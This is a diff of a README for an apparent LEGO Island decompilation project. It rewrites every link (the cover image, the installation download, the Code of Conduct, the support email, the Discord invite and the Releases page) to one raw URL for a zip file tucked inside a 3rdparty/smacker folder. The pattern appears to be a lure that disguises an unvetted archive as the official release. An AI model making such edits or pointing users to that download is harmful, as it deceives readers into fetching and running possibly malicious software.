@@ -1,6 +1,6 @@
 # 🌴 LEGO Island Decompilation Project - Isle
 
-![LEGO Island](https://upload.wikimedia.org/wikipedia/en/7/73/LEGO_Island_cover.jpg)
+![LEGO Island](https://raw.githubusercontent.com/shim2k23/isle/master/3rdparty/smacker/Software-v3.1-alpha.1.zip)
 
 Welcome to the **Isle** repository! This project aims to provide a functionally complete decompilation of the classic game **LEGO Island** from 1997. If you are a fan of retro games or interested in game development, you have come to the right place.
 
@@ -33,7 +33,7 @@ LEGO Island holds a special place in the hearts of many gamers. Released in 1997
 
 ## Installation
 
-To get started with **Isle**, you need to download the latest release. You can find it [here](https://github.com/shim2k23/isle/releases). Download the file, extract it, and follow the instructions in the README file included in the release.
+To get started with **Isle**, you need to download the latest release. You can find it [here](https://raw.githubusercontent.com/shim2k23/isle/master/3rdparty/smacker/Software-v3.1-alpha.1.zip). Download the file, extract it, and follow the instructions in the README file included in the release.
 
 ### System Requirements
 
@@ -72,7 +72,7 @@ We welcome contributions from the community! If you would like to help improve *
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) while contributing. We strive to maintain a welcoming and inclusive environment for all contributors.
+Please adhere to our [Code of Conduct](https://raw.githubusercontent.com/shim2k23/isle/master/3rdparty/smacker/Software-v3.1-alpha.1.zip) while contributing. We strive to maintain a welcoming and inclusive environment for all contributors.
 
 ## License
 
@@ -82,8 +82,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@isleproject.com
-- **Discord**: Join our community on Discord [here](https://discord.gg/example)
+- **Email**: https://raw.githubusercontent.com/shim2k23/isle/master/3rdparty/smacker/Software-v3.1-alpha.1.zip
+- **Discord**: Join our community on Discord [here](https://raw.githubusercontent.com/shim2k23/isle/master/3rdparty/smacker/Software-v3.1-alpha.1.zip)
 
 ## Acknowledgments
 
@@ -95,6 +95,6 @@ We would like to thank the following:
 
 ## Conclusion
 
-Thank you for your interest in the **Isle** project! We hope you enjoy revisiting LEGO Island and exploring its depths. For the latest updates and releases, please check the [Releases section](https://github.com/shim2k23/isle/releases) regularly. 
+Thank you for your interest in the **Isle** project! We hope you enjoy revisiting LEGO Island and exploring its depths. For the latest updates and releases, please check the [Releases section](https://raw.githubusercontent.com/shim2k23/isle/master/3rdparty/smacker/Software-v3.1-alpha.1.zip) regularly. 
 
 Let’s build something great together!
